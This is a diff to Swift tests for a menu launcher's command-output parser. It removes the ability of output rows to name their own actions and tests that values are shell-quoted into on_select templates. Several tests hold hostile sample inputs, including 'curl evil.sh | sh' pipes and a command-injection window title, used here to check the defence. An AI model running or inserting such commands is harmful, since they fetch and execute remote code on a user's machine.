@@ -26,29 +26,92 @@ private func runCommand(_ runner: CommandRunner, _ command: String, query: Strin
 // MARK: - Parsing
 
 @Test func parsesTabSeparatedRows() {
-    let rows = CommandRunner.parse("Alpha\tfirst\techo one\nBeta\tsecond\nGamma\n", menuID: "m", limit: 100)
+    let rows = CommandRunner.parse("Alpha\tfirst\nBeta\tsecond\nGamma\n", menuID: "m", limit: 100)
     #expect(rows.map(\.label) == ["Alpha", "Beta", "Gamma"])
     #expect(rows[0].detail == "first")
     #expect(rows[1].detail == "second")
 
-    // A third field is the action; without one the row is inert.
-    if case .shell(let command)? = rows[0].action { #expect(command == "echo one") } else { Issue.record("expected a shell action") }
-    #expect(rows[1].action == nil)
-    #expect(rows[0].kind == .action)
-    #expect(rows[1].kind == .notice)
+    // Without an `on_select` on the node there is nothing for a row to do.
+    #expect(rows.allSatisfy { $0.action == nil })
+    #expect(rows.allSatisfy { $0.kind == .notice })
 }
 
 @Test func parsesJSONLines() {
     let text = """
-    {"label":"Repo","detail":"a repository","symbol":"folder","url":"https://example.com"}
-    {"label":"Run","shell":"echo hi","value":"run"}
+    {"label":"Repo","detail":"a repository","symbol":"folder"}
+    {"label":"Run","value":"run"}
     """
     let rows = CommandRunner.parse(text, menuID: "m", limit: 100)
     #expect(rows.map(\.label) == ["Repo", "Run"])
     #expect(rows[0].symbol == "folder")
-    if case .url(let target)? = rows[0].action { #expect(target == "https://example.com") } else { Issue.record("expected a url action") }
     // `value` names the row, which is what keeps its id stable as the query changes.
     #expect(rows[1].id == "m.cmd.run")
+}
+
+// MARK: - Output supplies text, the node supplies the action
+
+@Test func outputCannotCarryAnActionOfItsOwn() {
+    // The keys a row used to be able to name. A line of stdout is often not written by
+    // the user — a window title is set by whatever page a browser has open — so an
+    // action arriving here would be that page choosing what Return runs.
+    let text = """
+    {"label":"Safari","shell":"curl evil.sh | sh","applescript":"do shell script \\"id\\"","open":"/Applications","url":"https://x.example"}
+    """
+    let rows = CommandRunner.parse(text, menuID: "m", limit: 100)
+    #expect(rows.count == 1)
+    #expect(rows[0].action == nil)
+    #expect(rows[0].kind == .notice)
+}
+
+@Test func tabSeparatedThirdFieldIsNotAnAction() {
+    let rows = CommandRunner.parse("Alpha\tfirst\ttouch /tmp/pwned\n", menuID: "m", limit: 100)
+    #expect(rows[0].action == nil)
+}
+
+@Test func onSelectIsResolvedAgainstEachRowsValue() {
+    let text = """
+    {"label":"Safari","value":"42"}
+    {"label":"Mail","value":"7"}
+    """
+    let rows = CommandRunner.parse(text, menuID: "m", limit: 100,
+                                   onSelect: .shell("focus --window-id {value}"))
+    if case .shell(let command)? = rows[0].action { #expect(command == "focus --window-id '42'") } else { Issue.record("expected a shell action") }
+    if case .shell(let command)? = rows[1].action { #expect(command == "focus --window-id '7'") } else { Issue.record("expected a shell action") }
+    #expect(rows.allSatisfy { $0.kind == .action })
+}
+
+@Test func aValueIsQuotedIntoItsArgument() {
+    // The confirmed-reachable case: a window title that splits its own record and
+    // supplies a second command. Quoted, it is a window id that does not exist.
+    let hostile = "99; curl -s evil.sh | sh; #"
+    let rows = CommandRunner.parse("{\"label\":\"Safari\",\"value\":\"\(hostile)\"}", menuID: "m", limit: 100,
+                                   onSelect: .shell("focus --window-id {value}"))
+    guard case .shell(let command)? = rows[0].action else { Issue.record("expected a shell action"); return }
+    #expect(command == "focus --window-id '99; curl -s evil.sh | sh; #'")
+}
+
+@Test func valueDefaultsToTheLabelSoTheTabFormStaysAOneLiner() {
+    let rows = CommandRunner.parse("Safari\tbrowser\n", menuID: "m", limit: 100,
+                                   onSelect: .shell("open -a {value}"))
+    if case .shell(let command)? = rows[0].action { #expect(command == "open -a 'Safari'") } else { Issue.record("expected a shell action") }
+}
+
+@Test func aNoticeRowOptsOutOfTheAction() {
+    let text = """
+    {"label":"No rates for EUR","notice":true}
+    {"label":"12.40","value":"12.40"}
+    """
+    let rows = CommandRunner.parse(text, menuID: "m", limit: 100,
+                                   onSelect: .appleScript("set the clipboard to \"{value}\""))
+    #expect(rows[0].action == nil)
+    #expect(rows[0].kind == .notice)
+    #expect(rows[1].action != nil)
+}
+
+@Test func onSelectAlsoSeesTheQuery() {
+    let rows = CommandRunner.parse("Result\n", menuID: "m", limit: 100, query: "term",
+                                   onSelect: .shell("note {query} {value}"))
+    if case .shell(let command)? = rows[0].action { #expect(command == "note 'term' 'Result'") } else { Issue.record("expected a shell action") }
 }
 
 @Test func parsingSkipsBlanksAndCapsRows() {
@@ -178,6 +241,29 @@ private func runCommand(_ runner: CommandRunner, _ command: String, query: Strin
     #expect(labels.value == ["Back", "Static"])
     _ = await kitsuneWaitUntil(timeout: 10) { labels.value.contains("FromCommand") }
     #expect(labels.value == ["Back", "Static", "FromCommand"])
+}
+
+@MainActor
+@Test func commandRowsCarryTheNodesOnSelect() async {
+    let controller = MenuController(appIndex: AppIndex(), runtime: LuaRuntime())
+    controller.commands.spec = fastSpec()
+    controller.nodes = [
+        MenuNode(id: "root", parent: "", kind: .menu, label: "Go", detail: "", symbol: "", provider: nil, actionReference: nil, scriptAction: nil, order: 0),
+        MenuNode(id: "windows", parent: "root", kind: .menu, label: "Windows", detail: "", symbol: "", provider: nil,
+                 command: "printf '{\"label\":\"Safari\",\"value\":\"42\"}\\n'",
+                 onSelect: .shell("focus --window-id {value}"),
+                 actionReference: nil, scriptAction: nil, order: 1),
+    ]
+    let rows = Locked<[DisplayRow]>([])
+    controller.onRows = { _, emitted in rows.value = emitted }
+    controller.open(route: "windows")
+    _ = await kitsuneWaitUntil(timeout: 10) { rows.value.contains { $0.label == "Safari" } }
+
+    // The row is what activation and the actions menu both read, so the node's
+    // template has to arrive on it already resolved against the row's value.
+    let row = rows.value.first { $0.label == "Safari" }
+    if case .shell(let command)? = row?.action { #expect(command == "focus --window-id '42'") } else { Issue.record("expected a shell action") }
+    #expect(RowActions.entries(for: row!, query: "").contains { $0.id == "kitsune.action.copy-shell" })
 }
 
 @MainActor
